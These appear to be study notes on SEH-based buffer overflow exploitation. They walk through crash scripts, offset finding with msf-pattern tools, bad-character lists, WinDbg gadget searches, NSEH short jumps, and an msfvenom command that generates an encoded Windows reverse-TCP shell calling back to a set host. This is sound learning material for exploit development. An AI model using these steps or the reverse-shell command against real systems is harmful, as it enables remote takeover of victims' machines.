# SEH-Based Buffer Overflow

## Steps to Execute a Buffer Overflow Attack

1. **Start by Building a Script that Causes a Crash**
    - Create a script in the desired language (e.g., Python) to send input to the vulnerable application and observe if it crashes. This is the initial step to confirm that the application is indeed vulnerable.

2. **Find EIP Location**
    - Use Metasploit Framework (msf) to create and find patterns.
        - `msf-pattern_create -l <length>`: Generates a unique pattern of a specified length.
        - View value with `!exchain`
        - `msf-pattern_offset -l <length> -q <EIP>`: Finds the offset of the EIP within the pattern.

3. **Confirm EIP is Overwritten**
    - Send the length identified by msf pattern offset + 4 bytes + rest of input buffer filler.
    - confirm with `!exchain`

4. **Check for Bad Characters**
    - Identify characters that might cause issues within the shellcode. Bad characters can interrupt the execution of the payload.
    - Test in chunks if necessary.
    - Place badchars after exchain eip overwrite.
    - Type `dds esp L5` and rotate through the values with `db <value>` and check if you find buffer, it should be in one of those arguments.
    - Example bad characters list:
      ```python
      badchars = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
      )
      ```
    - Windbg command to check bad characters:
        - `db esp -10 L20`: Dump 20 bytes before the ESP.
        - Be cautious of bytes that might not break other bytes but can break themselves.

5. **Find P/P/R**
    - Use narly to find modules that have P/P/R instruction that doesn't contain null bytes.
        - `lm m <module>`
        - `.load narly`
        - `!nmod`
        - Avoid pop esp but the followin gare valid:
            - ```msf-nasm_shell 
                pop eax - 58
                pop ebx - 5B
                pop ecx - 59
                pop edx - 5A
                pop esi - 5E
                pop edi - 5F 
                pop ebp - 5D
                ret - C3
                ```
            - The op codes are back to back so to generate all of em use this script:
                ```
                .block
                {
	                .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
	                {
		                .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
		                {
			                s-[1]b start_addr end_addr $t0 $t1 c3
		                }
	                }
                }
                ```
        - From there load it like so: `$><C:\Users\Path\To\script.wds`
        - Double check output with `u addr L3`
        - `inputBuffer += pack("<L", (0x1015a2f0))`

6. **Find Short Jump** 
    - `bp P/P/R`
    - Single step through the P/P/R using `t`x3
    - Run `dds eip L4` to view the value we need to jmp to
    - Run `a` to construct a jmp with the value from the command above. `jmp <value>`
    - Run `u eip L1` to view the length of the jmp
    - Pack it backwards and be sure to subtract 4 bytes from the buffer before: 
    - So if eb06 then: inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
    - 

7. **Generate Shellcode**
    - Use msfvenom to generate the shellcode for a reverse TCP shell:
        ```bash
        msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.237 LPORT=443 EXITFUNC=thread -f python -v shellcode –e x86/shikata_ga_nai -b "\x00"
        ```
    - Ensure the shellcode does not contain bad characters and is encoded appropriately.

8. **Don’t Forget NOP Sled**
    - Include NOP (No Operation) instructions to increase the reliability of the shellcode execution.
    - Typically, a series of 0x90 bytes (NOPs) are added before the shellcode to create a "NOP sled."